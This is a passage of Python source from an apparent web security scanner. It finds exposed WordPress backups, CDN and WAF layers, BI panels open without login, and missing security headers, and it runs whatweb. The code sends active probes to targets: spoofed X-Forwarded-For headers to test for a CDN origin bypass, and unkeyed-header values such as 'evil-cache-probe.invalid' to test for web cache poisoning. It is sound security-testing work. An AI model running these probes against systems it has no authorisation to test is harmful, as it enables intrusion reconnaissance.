            _is_sql  = bool(_SQL_SIG.search(r.text[:3000]))
            _is_xml  = r.text.lstrip().startswith("<?xml") or "<rss" in r.text[:200]
            _bk_risk = "CRITICAL" if _is_sql else "HIGH"
            _bkev    = out.output_path(
                phase,
                f"wp_backup_{_bkp.strip('/').replace('/', '_')[:40]}_{hostname}")
            _bkev.write_text(r.text[:10000], encoding="utf-8")
            out.add_finding(
                title=f"WordPress Backup/Export File Exposed: {_bkp}",
                url=base + _bkp, port=target["port"], risk=_bk_risk,
                description=(
                    f"The file {_bkp} is publicly accessible"
                    + (" and contains a SQL database dump" if _is_sql
                       else " and appears to be a WordPress export file" if _is_xml
                       else " (content accessible — review for sensitive data)")
                    + ". Exposed backups disclose all site data including user "
                    "credentials, private content, and configuration."
                ),
                output=r.text[:300],
                sources="fracture-wordpress", service=target["scheme"],
                output_file=str(_bkev),
                owasp="A01:2025 Broken Access Control", nist="AC-3",
                remediation=(
                    f"Delete or relocate {_bkp} outside the web root immediately. "
                    "If credentials were exposed, rotate all passwords. "
                    "Store backups in non-web-accessible storage."
                ),
                http_code=r.status_code,
            )
            vc.log(f"[wordpress] {'CRITICAL' if _is_sql else 'HIGH'}: "
                   f"backup exposed: {_bkp}", "ERROR")

    # ── 15. SUMMARY ──────────────────────────────────────────────────────────
    _sum_ev = out.output_path(phase, f"wp_scan_summary_{hostname}")
    try:
        _sum_ev.write_text(
            json.dumps({
                "target":           base,
                "version":          wp_info["version"],
                "version_source":   wp_info["version_source"],
                "users_count":      len(wp_info["users"]),
                "users":            wp_info["users"][:50],
                "plugins_count":    len(wp_info["plugins"]),
                "plugins":          wp_info["plugins"],
                "themes_count":     len(wp_info["themes"]),
                "themes":           wp_info["themes"],
                "xmlrpc_enabled":   wp_info["xmlrpc"],
                "xmlrpc_methods":   xmlrpc_methods[:50],
                "rest_api_exposed": wp_info["rest_api"],
                "multisite":        wp_info["multisite"],
                "login_accessible": wp_info["login_accessible"],
                "debug_log":        wp_info["debug_log"],
                "config_backups":   wp_info["config_backups"],
            }, indent=2),
            encoding="utf-8",
        )
    except Exception:
        pass

    # Deduplicate discovered paths preserving order
    _seen_wp: set = set()
    wp_info["discovered_paths"] = []
    for _wu, _wc, _wr in _wp_discovered_urls:
        if _wu not in _seen_wp:
            _seen_wp.add(_wu)
            wp_info["discovered_paths"].append((_wu, _wc, _wr))

    vc.log(
        f"[wordpress] Scan complete — "
        f"ver:{wp_info['version'] or 'unknown'}  "
        f"users:{len(wp_info['users'])}  "
        f"plugins:{len(wp_info['plugins'])}  "
        f"themes:{len(wp_info['themes'])}  "
        f"xmlrpc:{wp_info['xmlrpc']}  "
        f"rest:{wp_info['rest_api']}  "
        f"discovered:{len(wp_info['discovered_paths'])}",
        "SUCCESS",
    )
    return wp_info


def _detect_cdn(headers: "dict", body: str) -> str:
    """Identify CDN provider from response headers and body. Returns CDN name or ''."""
    _h_lower = {k.lower(): v for k, v in headers.items()}
    for hdr, cdn_name in _CDN_HDR_PATTERNS:
        if hdr.lower() in _h_lower:
            return cdn_name
    srv = headers.get("Server", "")
    if srv:
        m = _CDN_SERVER_RE.search(srv)
        if m:
            _name_map = {
                "cloudflare": "Cloudflare", "akamaighost": "Akamai", "akamai": "Akamai",
                "fastly": "Fastly", "cloudfront": "Amazon CloudFront", "varnish": "Varnish",
                "bunny": "BunnyCDN", "bunnycdn": "BunnyCDN", "keycdn": "KeyCDN",
                "stackpath": "StackPath", "maxcdn": "MaxCDN",
                "netlify": "Netlify", "vercel": "Vercel",
            }
            return _name_map.get(m.group(1).lower(), m.group(1))
    via = headers.get("Via", "").lower()
    if "cloudfront" in via:
        return "Amazon CloudFront"
    if "varnish" in via:
        return "Varnish"
    if "fastly" in via:
        return "Fastly"
    return ""


def _detect_edge_security(headers: "dict", body: str) -> "list[str]":
    """Identify edge security platforms (WAF, bot-protection, cloud security) from
    response headers and body.  Returns a deduplicated list of platform names."""
    _found: list = []
    _h_lower = {k.lower(): v for k, v in headers.items()}
    for _hdr, _platform in _EDGE_SECURITY_HDR_PATTERNS:
        if _hdr in _h_lower and _platform not in _found:
            _found.append(_platform)
    for _prefix, _platform in _EDGE_SECURITY_HDR_PREFIXES:
        if any(k.startswith(_prefix) for k in _h_lower) and _platform not in _found:
            _found.append(_platform)
    _body_sample = (body or "")[:4096]
    for _pat, _platform in _EDGE_SECURITY_BODY_PATTERNS:
        if _pat.search(_body_sample) and _platform not in _found:
            _found.append(_platform)
    return _found


def _detect_bi_tools(text: str, headers: "dict") -> "list[str]":
    """Detect Business Intelligence / monitoring platforms from page content and headers."""
    _h_str = " ".join(f"{k}: {v}" for k, v in headers.items())
    _all = text + " " + _h_str
    return [name for name, pats in _BI_PATTERNS.items() if any(p.search(_all) for p in pats)]


def _classify_web_structure(body: str, headers: "dict", spa_evidence: "list",
                            bi_tools: "list | None" = None,
                            cms: "list | None" = None) -> str:
    """Classify the web application structure type from initial response data.

    Returns one of: SPA, SSR Hybrid (Next.js/Nuxt/Vue), Server-Rendered (<lang>),
    BI Platform (<name>), CMS (<name>), Static HTML, API-first, or Unknown.
    """
    ct = headers.get("Content-Type", "")
    if ("application/json" in ct or "application/xml" in ct) and "<html" not in (body or "").lower():
        return "API-first"
    if body:
        if "__NEXT_DATA__" in body:
            return "SSR Hybrid (Next.js)"
        if "__NUXT_FULL__" in body or "data-n-head" in body:
            return "SSR Hybrid (Nuxt)"
        if "data-server-rendered" in body or "__vue_ssr_context__" in body:
            return "SSR Hybrid (Vue)"
    if spa_evidence:
        return "SPA"
    # BI platform / CMS detected — always dynamic, never static
    if bi_tools:
        return f"BI Platform ({bi_tools[0]})"
    if cms:
        return f"CMS ({cms[0]})"
    _all = (body or "") + " ".join(f"{k}: {v}" for k, v in headers.items())
    for lang, pat in _LANG_PATTERNS.items():
        if pat.search(_all):
            return f"Server-Rendered ({lang})"
    # Static HTML: no scripting and no meta/JS redirects that indicate a dynamic entry page
    if body and "<html" in body.lower():
        _bl = body.lower()
        _has_script    = _bl.count("<script") > 0
        _has_metaredir = 'http-equiv="refresh"' in _bl or "http-equiv='refresh'" in _bl
        _has_jsredir   = "window.location" in _bl or "document.location" in _bl
        if not _has_script and not _has_metaredir and not _has_jsredir:
            return "Static HTML"
    return "Unknown"


def _phase_recon(target: dict, cfg: dict, pm: ProgressManager,
                 out: OutputManager, sess: requests.Session) -> None:
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    phase   = "recon"
    vc.status(phase, "Recon", "running", "HTTP probe", 0, 10)

    # Wildcard detection — run before any path-based checks so brute-forcers
    # can be skipped and individual URL findings can be validated.
    vc.status(phase, "Recon", "running", "Wildcard probe", 0, 10)
    wc_baseline = _detect_wildcard(url, sess, timeout)
    if wc_baseline is not None:
        vc.log(
            f"[recon] Wildcard/catch-all detected (HTTP {wc_baseline['status']} "
            f"for all paths{'; redirect → ' + wc_baseline['location'] if wc_baseline.get('redirect') else ''}). "
            "Directory brute-forcing skipped; all path findings will be validated against baseline.",
            "INFO",
        )
        out.add_finding(
            title=f"Wildcard (*) Detected: {url}",
            url=url, port=target["port"], risk="INFO",
            description=(
                f"A wildcard/catch-all response was detected at {url} — the server returns "
                f"HTTP {wc_baseline['status']} for all unknown paths"
                + (f", redirecting to {wc_baseline['location']}" if wc_baseline.get("redirect") else "")
                + ". Directory brute-forcing with gobuster is unreliable on this host; "
                "feroxbuster will still run as it handles wildcards natively."
            ),
            output=f"Wildcard: HTTP {wc_baseline['status']} for all paths",
            sources="fracture-recon", service=target["scheme"],
            owasp="A05:2025 Security Misconfiguration", nist="CM-7",
            remediation="",
        )

    try:
        resp        = sess.get(url, timeout=timeout, allow_redirects=True)
        status_code = resp.status_code
        headers     = resp.headers
        body        = resp.text[:50000]
    except Exception as e:
        vc.log(f"[recon] Could not connect to {url}: {e}", "ERROR")
        out.log_error("recon-probe", url, str(e))
        return wc_baseline, []

    vc.log(f"[recon] {url} → HTTP {status_code}", "INFO")
    # Derive the actual base path so non-root targets (e.g. /ibmcognos/) are recorded correctly
    _base_path = urllib.parse.urlparse(url).path or "/"
    # Write base path immediately so the Structure tab shows something from the first moment
    try:
        _write_structure_map(out, target, path_statuses={_base_path: status_code}, source="recon")
    except Exception:
        pass
    server_hdr  = headers.get("Server", "")
    powered_by  = headers.get("X-Powered-By", "")
    all_text    = body + " ".join(f"{k}: {v}" for k, v in headers.items())

    # Save initial HTTP probe request + response as separate evidence files
    _probe_rq, _probe_rp = _save_http_evidence(out, phase, "http_probe_" + target["hostname"], resp)
    _probe_files = f"{_probe_rq},{_probe_rp}"

    # Check probe response for missing security headers.
    # Risk and format match shcheck so findings merge when both tools run.
    _HSTS_HDR = "Strict-Transport-Security"
    for _hdr_name, _hdr_risk, _, _hdr_desc, _hdr_nist, _hdr_remed in _SECURITY_HEADERS:
        if _hdr_name == _HSTS_HDR and not target["is_https"]:
            continue
        if _hdr_name not in headers:
            out.add_finding(
                title=f"Missing Security Header: {_hdr_name}",
                url=url, port=target["port"],
                risk=_hdr_risk,
                description=f"The HTTP security header '{_hdr_name}' is absent.",
                output=f"Missing: {_hdr_name}",
                affected=_url_rel_path(url, target["url"]),
                sources="fracture-recon", service=target["scheme"],
                output_file=_probe_files,
                owasp="A05:2025 Security Misconfiguration", nist=_hdr_nist,
                remediation=_hdr_remed,
                http_code=resp.status_code,
            )

    detected_cms = [n for n, pats in _CMS_PATTERNS.items()
                    if any(p.search(all_text) for p in pats)]

    # Fallback: probe /wp-login.php for WordPress sites that serve CDN-rewritten
    # HTML without wp-content/wp-includes references in the page source.
    if "WordPress" not in detected_cms:
        try:
            _wplogin = sess.get(
                url.rstrip("/") + "/wp-login.php",
                timeout=min(timeout, 6), allow_redirects=True)
            if (_wplogin.status_code == 200 and
                    ("user_login" in _wplogin.text or
                     "wp-submit" in _wplogin.text)):
                detected_cms.append("WordPress")
                vc.log("[recon] WordPress detected via /wp-login.php probe", "INFO")
        except Exception:
            pass

    if server_hdr:
        out.add_finding(
            title="Header Data Leakage: Server",
            url=url, port=target["port"], risk="LOW",
            description="The HTTP Server response header reveals the web server software name and version, reducing the attacker's reconnaissance effort needed to identify version-specific vulnerabilities.",
            output=f"Server: {server_hdr}", sources="fracture-recon",
            service=target["scheme"], output_file=_probe_files,
            owasp="A05:2025 Security Misconfiguration", nist="SI-2",
            remediation="Remove or genericise the Server response header in the web server configuration (e.g., ServerTokens Prod in Apache; server_tokens off in nginx).",
            http_code=resp.status_code,
        )
    if powered_by:
        out.add_finding(
            title="Header Data Leakage: X-Powered-By",
            url=url, port=target["port"], risk="LOW",
            description="The X-Powered-By response header discloses the application framework, language, or runtime version, reducing the attacker's effort needed to identify version-specific vulnerabilities.",
            output=f"X-Powered-By: {powered_by}", sources="fracture-recon",
            service=target["scheme"], output_file=_probe_files,
            owasp="A05:2025 Security Misconfiguration", nist="SI-2",
            remediation='Remove or suppress the X-Powered-By header at the application framework or reverse-proxy level (e.g., app.disable("x-powered-by") in Express; Header unset X-Powered-By in Apache).',
            http_code=resp.status_code,
        )
    for cms in set(detected_cms):
        vc.log(f"[recon] CMS detected: {cms}", "SUCCESS")
        out.add_finding(
            title=f"CMS Detected: {cms}",
            url=url, port=target["port"], risk="INFO",
            description=f"The CMS '{cms}' was identified from page source signatures.",
            output=f"CMS: {cms}", sources="fracture-recon",
            service=target["scheme"], output_file=_probe_files,
            owasp="A05:2025 Security Misconfiguration", nist="CM-8",
            remediation="Ensure the CMS and all plugins/themes are kept up to date.",
            http_code=resp.status_code,
        )

    # ── CDN, web structure, and BI tool detection ─────────────────────────────
    _recon_cdn = _detect_cdn(headers, body)
    _recon_is_spa, _recon_spa_ev = False, []
    try:
        _recon_is_spa, _recon_spa_ev = _detect_spa(body, url, 0)
    except Exception:
        pass
    # Detect BI tools before classifying web structure so the classifier can
    # use them to avoid misidentifying BI platform entry pages as "Static HTML".
    _detected_bi = _detect_bi_tools(all_text, headers)
    # URL-path-based BI detection: catches platforms whose entry page carries
    # no body fingerprint (e.g. Cognos meta-refresh redirect with zero scripts).
    _url_path_lower = urllib.parse.urlparse(url).path.lower()
    _URL_PATH_BI = {
        "IBM Cognos":    "/ibmcognos",
        "Grafana":       "/grafana",
        "Kibana":        "/kibana",
        "Tableau":       "/vizportal",
        "Splunk":        "/en-us/app/",
        "Zabbix":        "/zabbix",
        "Nagios":        "/nagios",
        "Prometheus":    "/prometheus",
        "Apache Superset": "/superset",
        "Redash":        "/redash",
        "Looker":        "/looker",
    }
    for _bi_name, _bi_path_sig in _URL_PATH_BI.items():
        if _bi_path_sig in _url_path_lower and _bi_name not in _detected_bi:
            _detected_bi.append(_bi_name)
    _recon_web_structure = _classify_web_structure(
        body, headers, _recon_spa_ev,
        bi_tools=_detected_bi or None,
        cms=detected_cms or None,
    )
    _recon_edge_security = _detect_edge_security(headers, body)
    if _recon_cdn:
        vc.log(f"[recon] CDN detected: {_recon_cdn}", "INFO")
    if _recon_edge_security:
        vc.log(f"[recon] Edge security detected: {', '.join(_recon_edge_security)}", "INFO")
    if _recon_web_structure not in ("Unknown", ""):
        vc.log(f"[recon] Web structure: {_recon_web_structure}", "INFO")
    if _detected_bi:
        vc.log(f"[recon] BI/monitoring tools detected: {', '.join(_detected_bi)}", "INFO")

    # CDN origin-bypass probe: test whether IP-spoofing headers cause the CDN
    # to strip itself from the response, exposing the origin server directly.
    if _recon_cdn:
        try:
            _bp_r = sess.get(url, timeout=min(timeout, 8), allow_redirects=True,
                             headers={"X-Forwarded-For": "127.0.0.1",
                                      "X-Real-IP": "127.0.0.1"})
            _bp_srv = _bp_r.headers.get("Server", "").lower()
            _cdn_key = _recon_cdn.lower().split()[0]
            if _cdn_key in server_hdr.lower() and _cdn_key not in _bp_srv and _bp_srv:
                _bp_rq, _bp_rp = _save_http_evidence(out, phase, "cdn_bypass_probe", _bp_r)
                out.add_finding(
                    title=f"Potential CDN Origin Bypass: {_recon_cdn}",
                    url=url, port=target["port"], risk="MEDIUM",
                    description=(
                        f"A request with X-Forwarded-For / X-Real-IP spoofing headers "
                        f"returned a different Server header, suggesting the origin server "
                        f"may be reachable without passing through {_recon_cdn}. "
                        f"Direct access to the origin bypasses CDN-level WAF and rate-limiting."
                    ),
                    output=(f"CDN: {_recon_cdn}\n"
                            f"Original Server: {server_hdr}\n"
                            f"Bypass Server: {_bp_r.headers.get('Server', '')}"),
                    sources="fracture-recon", service=target["scheme"],
                    output_file=f"{_bp_rq},{_bp_rp}",
                    owasp="A05:2025 Security Misconfiguration", nist="SC-5",
                    remediation=(
                        "Restrict origin server to accept connections only from CDN IP ranges; "
                        "enforce firewall rules to block direct internet access to the origin."
                    ),
                    http_code=_bp_r.status_code,
                )
        except Exception:
            pass

    # ── CDN / WAF presence finding + cache poisoning probes ──────────────────
    if _recon_cdn or _recon_edge_security:
        _waf_cdn_name = _recon_cdn or (_recon_edge_security[0] if _recon_edge_security else "")
        _waf_all = ([_recon_cdn] if _recon_cdn else []) + _recon_edge_security
        _waf_str = ", ".join(_waf_all)
        out.add_finding(
            title=f"CDN / WAF Active: {_waf_str}",
            url=url, port=target["port"], risk="INFO",
            description=(
                f"A CDN or WAF layer ({_waf_str}) was identified in front of the target. "
                "This has the following testing implications:\n"
                "1. TLS is terminated at the CDN edge — TLS findings reflect the CDN's "
                "configuration, not the origin server's.\n"
                "2. WAF rules may suppress or block injection probes (SQLi, XSS, traversal) "
                "— absence of a finding does not confirm absence of the vulnerability.\n"
                "3. Directory brute-forcing has been throttled to avoid IP blocks from "
                "bot-detection. Results may be less comprehensive than against a direct target.\n"
                "4. Web cache poisoning is in scope — the CDN caching layer may cache "
                "attacker-controlled header values and serve them to other users."
            ),
            output=f"Detected: {_waf_str}",
            sources="fracture-recon", service=target["scheme"],
            owasp="A05:2025 Security Misconfiguration", nist="SC-5",
            remediation=(
                "Ensure the WAF rule set is kept up to date and covers OWASP Top 10 2025. "
                "Restrict origin server access to CDN IP ranges only. "
                "Review CDN cache key configuration to prevent web cache poisoning."
            ),
            http_code=resp.status_code,
        )

        # Web cache poisoning probes — test whether unkeyed request headers are
        # reflected in cached responses.  Each probe sends the header once and
        # checks for reflection in the response body, Location, or Link headers.
        # A reflected value that the CDN could cache constitutes a web cache
        # poisoning vector that may affect all users receiving the cached response.
        _wcp_headers = [
            ("X-Forwarded-Host",   "evil-cache-probe.invalid"),
            ("X-Original-URL",     "/cache-probe-path"),
            ("X-Rewrite-URL",      "/cache-probe-path"),
            ("X-Host",             "evil-cache-probe.invalid"),
            ("X-Forwarded-Server", "evil-cache-probe.invalid"),
            ("X-Forwarded-Scheme", "http"),
            ("X-Forwarded-Prefix", "/cache-probe-prefix"),
        ]
        _wcp_timeout = min(timeout, 8)
        for _wcp_hdr, _wcp_val in _wcp_headers:
            try:
                # Cache-bust the probe so we hit the origin, not a stale cached copy
                _wcp_bust = f"fracture-probe-{_wcp_hdr.lower().replace('-', '')}"
                _wcp_probe_url = (url.rstrip("/") + "/"
                                  + f"?{_wcp_bust}={int(time.time())}"
                                  if "?" not in url else
                                  url + f"&{_wcp_bust}={int(time.time())}")
                _wcp_r = sess.get(
                    _wcp_probe_url,
                    timeout=_wcp_timeout,
                    allow_redirects=False,
                    headers={_wcp_hdr: _wcp_val},
                )
                _wcp_body    = (_wcp_r.text or "")[:8192]
                _wcp_loc     = _wcp_r.headers.get("Location", "")
                _wcp_link    = _wcp_r.headers.get("Link", "")
                _wcp_reflect = _wcp_val in _wcp_body or _wcp_val in _wcp_loc or _wcp_val in _wcp_link
                if _wcp_reflect:
                    _wcp_rq, _wcp_rp = _save_http_evidence(
                        out, phase,
                        f"cache_poison_{_wcp_hdr.lower().replace('-', '_')}",
                        _wcp_r)
                    out.add_finding(
                        title=f"Web Cache Poisoning: {_wcp_hdr} Reflected",
                        url=url, port=target["port"], risk="HIGH",
                        description=(
                            f"The '{_wcp_hdr}' request header value was reflected in the "
                            f"response (body, Location, or Link). Because {_waf_cdn_name} "
                            "caches responses, an attacker can send a request with a "
                            f"malicious '{_wcp_hdr}' value, causing the CDN to cache the "
                            "poisoned response and serve it to all subsequent users — "
                            "without those users sending the header themselves."
                        ),
                        output=(
                            f"Probe header: {_wcp_hdr}: {_wcp_val}\n"
                            f"Reflected in: "
                            + ("body " if _wcp_val in _wcp_body else "")
                            + ("Location " if _wcp_val in _wcp_loc else "")
                            + ("Link" if _wcp_val in _wcp_link else "")
                        ),
                        affected=url,
                        sources="fracture-recon", service=target["scheme"],
                        output_file=f"{_wcp_rq},{_wcp_rp}",
                        owasp="A05:2025 Security Misconfiguration", nist="SI-10",
                        remediation=(
                            "Configure the CDN cache key to include all headers that the "
                            "origin reflects. Remove or normalise unkeyed headers at the CDN "
                            "edge before forwarding to origin. Audit CDN cache rules to "
                            "ensure user-controlled values cannot influence cached responses."
                        ),
                        http_code=_wcp_r.status_code,
                    )
                    vc.log(
                        f"[recon] Web cache poisoning — {_wcp_hdr} reflected in response",
                        "WARNING",
                    )
            except Exception:
                pass

    # BI / monitoring tool unauthenticated access probes
    for _bi_name in _detected_bi:
        for _bi_path, _bi_desc in _BI_UNAUTH_PROBES.get(_bi_name, []):
            try:
                _bi_r = sess.get(
                    url.rstrip("/") + _bi_path,
                    timeout=min(timeout, 6), allow_redirects=False)
                if _bi_r.status_code == 200:
                    _bi_rq, _bi_rp = _save_http_evidence(
                        out, phase,
                        f"bi_{_bi_name.lower().replace(' ', '_').replace('/', '_')}_probe",
                        _bi_r)
                    out.add_finding(
                        title=f"Unauthenticated {_bi_name} Access: {_bi_desc}",
                        url=url.rstrip("/") + _bi_path,
                        port=target["port"], risk="HIGH",
                        description=(
                            f"The {_bi_name} {_bi_desc} at "
                            f"'{_bi_path}' returned HTTP 200 without authentication. "
                            f"Business Intelligence and monitoring panels can expose "
                            f"sensitive metrics, internal service topology, and credentials."
                        ),
                        output=f"HTTP 200\n{_bi_r.text[:400]}",
                        affected=_bi_path,
                        sources="fracture-recon", service=target["scheme"],
                        output_file=f"{_bi_rq},{_bi_rp}",
                        owasp="A01:2025 Broken Access Control", nist="AC-3",
                        remediation=(
                            f"Require authentication for {_bi_path}. "
                            f"Place the {_bi_name} interface behind a VPN or "
                            f"network-level access control if possible."
                        ),
                        http_code=200,
                    )
            except Exception:
                pass

    vc.status(phase, "Recon", "running", "Tech fingerprint (whatweb)", 1, 10)
    _ww_versions: list = []   # [(name, version_str)] collected for searchsploit
    whatweb = _find_tool("whatweb")
    if whatweb:
        ww_out = out.output_path(phase, "whatweb_" + target["hostname"])
        cmd = [whatweb, f"--log-json={ww_out}", "-a", "3", "--quiet", "--no-errors", url]
        vc.log("[recon] Running whatweb ...", "INFO")
        try:
            proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
            _register_proc(proc)
            proc.communicate(timeout=60)
            _deregister_proc(proc)
            out.log_command("whatweb", cmd, ww_out)
            if ww_out.exists():
                # Security header names (from _SECURITY_HEADERS, defined further in this
                # module — resolved at call-time, not definition-time)
                _SEC_HDR_NAMES = {h[0] for h in _SECURITY_HEADERS}
                # Case-folded set for matching against headers reported by WhatWeb
                # (HTTP header names are case-insensitive per RFC 7230)
                _SEC_HDR_LOWER = {h.lower() for h in _SEC_HDR_NAMES}
                # Regex matching HTTP-header-style plugin names (e.g. X-Frame-Options, Via)
                _HDR_NAME_RE = re.compile(r'^[A-Z][a-zA-Z]*(?:-[A-Za-z]+)+$')
                # Plugins to skip entirely — noise or already handled by fracture-headers
                _SKIP_WW = {
                    "Script", "HTML", "Title", "Meta-Refresh", "IP", "Country",
                    "Email", "Cookies", "Open-Graph-Protocol", "HTML5",
                    "Bootstrap", "jQuery", "X-Powered-By", "Server", "HTTPServer",
                    # Cookie attributes — not technologies
                    "HttpOnly", "Secure", "PasswordField", "RedirectLocation",
                }
                # Fast lookup: WhatWeb-reported header name → CDN / edge security platform.
                # Used in both the UncommonHeaders handler and the header-like plugin path
                # so that headers detected by WhatWeb (which makes its own HTTP request)
                # are not missed when the initial probe headers didn't carry them.
                _ww_cdn_hdr  = {h.lower(): n for h, n in _CDN_HDR_PATTERNS}
                _ww_edge_hdr = {h.lower(): n for h, n in _EDGE_SECURITY_HDR_PATTERNS}
                # WhatWeb plugin names that directly identify a CDN or security platform.
                # WhatWeb ships plugins for many CDN/WAF vendors; mapping those to our
                # canonical names lets us update _recon_cdn / _recon_edge_security from
                # WhatWeb hits without requiring a header-level match.
                _ww_plugin_to_cdn = {
                    "akamai": "Akamai", "cloudflare": "Cloudflare",
                    "fastly": "Fastly", "cloudfront": "Amazon CloudFront",
                    "amazon-cloudfront": "Amazon CloudFront",
                    "varnish": "Varnish", "netlify": "Netlify",
                    "vercel": "Vercel", "bunnycdn": "BunnyCDN",
                    "keycdn": "KeyCDN", "stackpath": "StackPath",
                }
                _ww_plugin_to_edge = {
                    "sucuri": "Sucuri WAF", "imperva": "Imperva",
                    "incapsula": "Imperva", "datadome": "DataDome",
                    "perimeterx": "PerimeterX / HUMAN Security",
                    "human-security": "PerimeterX / HUMAN Security",
                    "kasada": "Kasada", "barracuda": "Barracuda WAF",
                    "fortiweb": "Fortinet FortiWeb", "modsecurity": "ModSecurity",
                    "reblaze": "Reblaze", "f5-shape": "F5 Shape Security",
                }
                # Track which security headers whatweb observed as present
                ww_found_sec_hdrs: set = set()

                # Parse the WhatWeb JSON log as a complete JSON document.
                # WhatWeb --log-json writes a valid JSON array; fall back to
                # line-by-line only for non-standard output formats.
                _ww_records: list = []
                _ww_raw = ww_out.read_text(encoding="utf-8", errors="replace")
                try:
                    _parsed = json.loads(_ww_raw)
                    _ww_records = _parsed if isinstance(_parsed, list) else [_parsed]
                except json.JSONDecodeError:
                    for _ww_line in _ww_raw.splitlines():
                        _ww_line = _ww_line.strip()
                        if not _ww_line:
                            continue
                        try:
                            _r = json.loads(_ww_line)
                            if isinstance(_r, list):
                                _ww_records.extend(_r)
                            elif isinstance(_r, dict):
                                _ww_records.append(_r)
                        except Exception:
                            pass

                # Extract HTTP status from the first record that carries one.
                _ww_http_status: "int | None" = None
                for _wr in _ww_records:
                    if isinstance(_wr, dict) and _wr.get("http_status"):
                        _ww_http_status = int(_wr["http_status"])
                        break
                # Human-readable suffix included in every finding description.
                _hs = f" [HTTP {_ww_http_status}]" if _ww_http_status else ""

                for rec in _ww_records:
                    if not isinstance(rec, dict):
                        continue
                    plugins = rec.get("plugins", {})
                    for pname, pdata in plugins.items():
                        try:
                            if pname in _SKIP_WW:
                                continue

                            # Known security header present — track and skip Tech finding
                            if pname in _SEC_HDR_NAMES:
                                ww_found_sec_hdrs.add(pname)
                                continue

                            # Uncommon-Headers plugin — WhatWeb packs all uncommon
                            # header names as a comma-separated list inside a single
                            # string entry.  Split on commas first, then on ':' for
                            # any items that carry a value, and emit one finding each.
                            if pname in ("UncommonHeaders", "Uncommon-Headers"):
                                for hdr_val in pdata.get("string", []):
                                    for _raw_item in hdr_val.split(","):
                                        _raw_item = _raw_item.strip()
                                        if not _raw_item:
                                            continue
                                        _hv_parts = _raw_item.split(":", 1)
                                        hdr_name  = _hv_parts[0].strip()
                                        hdr_value = _hv_parts[1].strip() if len(_hv_parts) > 1 else ""
                                        if not hdr_name:
                                            continue
                                        # If this is a known security header, track it as
                                        # present and suppress the "Unknown Header" finding —
                                        # the Missing Security Header loop handles it instead.
                                        if hdr_name.lower() in _SEC_HDR_LOWER:
                                            ww_found_sec_hdrs.add(
                                                next(h for h in _SEC_HDR_NAMES
                                                     if h.lower() == hdr_name.lower())
                                            )
                                            continue
                                        # CDN / edge security header identified by WhatWeb?
                                        _ww_hn_l = hdr_name.lower()
                                        _ww_known = False
                                        if _ww_hn_l in _ww_cdn_hdr:
                                            if not _recon_cdn:
                                                _recon_cdn = _ww_cdn_hdr[_ww_hn_l]
                                                vc.log(f"[recon] CDN identified via WhatWeb header: {_recon_cdn}", "INFO")
                                            _ww_known = True
                                        elif _ww_hn_l in _ww_edge_hdr:
                                            _ww_es_n = _ww_edge_hdr[_ww_hn_l]
                                            if _ww_es_n not in _recon_edge_security:
                                                _recon_edge_security.append(_ww_es_n)
                                                vc.log(f"[recon] Edge security identified via WhatWeb header: {_ww_es_n}", "INFO")
                                            _ww_known = True
                                        else:
                                            for _ww_pfx, _ww_pfx_n in _EDGE_SECURITY_HDR_PREFIXES:
                                                if _ww_hn_l.startswith(_ww_pfx):
                                                    if _ww_pfx_n not in _recon_edge_security:
                                                        _recon_edge_security.append(_ww_pfx_n)
                                                        vc.log(f"[recon] Edge security identified via WhatWeb header: {_ww_pfx_n}", "INFO")
                                                    _ww_known = True
                                                    break
                                        if _ww_known:
                                            continue
                                        out.add_finding(
                                            title=f"Unknown Header Identified: {hdr_name}",
                                            url=url, port=target["port"], risk="INFO",
                                            description=(
                                                f"An uncommon or non-standard HTTP header "
                                                f"'{hdr_name}' was observed in the response{_hs}."
                                                + (f" Value: {hdr_value}" if hdr_value else "")
                                            ),
                                            output=(f"HTTP Status: {_ww_http_status}\n"
                                                    if _ww_http_status else "")
                                                   + f"Header: {hdr_name}"
                                                   + (f"\nValue: {hdr_value}" if hdr_value else ""),
                                            sources="whatweb", service=target["scheme"],
                                            output_file=str(ww_out),
                                            owasp="A05:2025 Security Misconfiguration",
                                            nist="CM-7",
                                            remediation=(
                                                "Review the header for necessity; "
                                                "remove non-standard headers if not required."
                                            ),
                                            http_code=_ww_http_status or 0,
                                        )
                                continue

                            versions = pdata.get("version", [])
                            version  = versions[0] if versions else ""

                            # Header-like plugin name (not a known security header)
                            if _HDR_NAME_RE.match(pname):
                                # Check against CDN / edge security patterns before
                                # emitting an "Unknown Header" finding.
                                _ww_pn_l = pname.lower()
                                _ww_pn_known = False
                                if _ww_pn_l in _ww_cdn_hdr:
                                    if not _recon_cdn:
                                        _recon_cdn = _ww_cdn_hdr[_ww_pn_l]
                                        vc.log(f"[recon] CDN identified via WhatWeb header: {_recon_cdn}", "INFO")
                                    _ww_pn_known = True
                                elif _ww_pn_l in _ww_edge_hdr:
                                    _ww_pn_es = _ww_edge_hdr[_ww_pn_l]
                                    if _ww_pn_es not in _recon_edge_security:
                                        _recon_edge_security.append(_ww_pn_es)
                                        vc.log(f"[recon] Edge security identified via WhatWeb header: {_ww_pn_es}", "INFO")
                                    _ww_pn_known = True
                                else:
                                    for _ww_pfx2, _ww_pfx2_n in _EDGE_SECURITY_HDR_PREFIXES:
                                        if _ww_pn_l.startswith(_ww_pfx2):
                                            if _ww_pfx2_n not in _recon_edge_security:
                                                _recon_edge_security.append(_ww_pfx2_n)
                                                vc.log(f"[recon] Edge security identified via WhatWeb header: {_ww_pfx2_n}", "INFO")
                                            _ww_pn_known = True
                                            break
                                if _ww_pn_known:
                                    continue
                                out.add_finding(
                                    title=f"Unknown Header Identified: {pname}",
                                    url=url, port=target["port"], risk="INFO",
                                    description=(
                                        f"An unrecognised HTTP header '{pname}' "
                                        f"was observed in the response{_hs}."
                                        + (f" Value: {version}" if version else "")
                                    ),
                                    output=((f"HTTP Status: {_ww_http_status}\n"
                                             if _ww_http_status else "")
                                            + f"Header: {pname}"
                                            + (f"\nValue: {version}" if version else "")),
                                    sources="whatweb", service=target["scheme"],
                                    output_file=str(ww_out),
                                    owasp="A05:2025 Security Misconfiguration",
                                    nist="CM-7",
                                    remediation=(
                                        "Review the header for necessity; "
                                        "remove non-standard headers if not required."
                                    ),
                                    http_code=_ww_http_status or 0,
                                )
                                continue

                            # Standard technology finding.
                            # If the plugin name is a CDN or edge security platform,
                            # update the corresponding recon variables so they appear
                            # in target_profile.json alongside the technology finding.
                            _ww_pn_canon = pname.lower()
                            if _ww_pn_canon in _ww_plugin_to_cdn and not _recon_cdn:
